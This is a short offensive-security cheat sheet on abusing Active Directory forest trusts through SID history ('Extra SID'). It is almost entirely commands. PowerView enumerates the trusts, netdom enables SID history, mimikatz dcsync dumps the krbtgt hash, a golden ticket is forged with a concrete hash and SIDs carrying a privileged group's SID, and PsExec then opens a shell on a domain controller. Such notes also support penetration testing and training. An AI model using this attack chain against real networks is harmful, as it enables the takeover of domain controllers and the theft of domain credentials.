# Extra SID

## Enumeration

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"># Enumerate Trusts
Get-DomainTrust -Domain corp2.com
# If TrusAtributes = FOREST_TRANSITIVE means SID Filtering is enabled
# If TrusAtributes = TREAT_AS_EXTERNAL,FOREST_TRANSITIVE means SID Filtering is disabled and we can compromise it
# SID History can be enabled with
<strong>netdom trust corp2.com /d:corp1.com /enablesidhistory:yes
</strong></code></pre>

## Exploitation

{% code overflow="wrap" %}
```powershell
# Obtaining krbtgt password hash
lsadump::dcsync /domain:corp1.com /user:corp1\krbtgt
# Resolve domain SIDs
Get-DomainSID -domain corp1.com
Get-DomainSID -domain corp2.com
# Enumerate members of the Administrators group to try and find something with a SID higher than 1000 otherwise SID filtering will stop it. 
Get-DomainGroupMember -Identity "Administrators" -Domain corp2.com
# Generate the golden ticket superGroup in ExtraSids
kerberos::golden /user:h4x /domain:corp1.com /sid:S-1-5-21-1587569303-1110564223-1586047116 /krbtgt:6b1bca4a1f7dbd67e28d3491290e4cb3 /sids:S-1-5-21-3759240818-3619593844-2110795065-1106 /ptt
# Obtain access to DC01 with PsExec
c:\tools\SysinternalsSuite\PsExec.exe \\dc01.corp2.com cmd
whoami
```
{% endcode %}
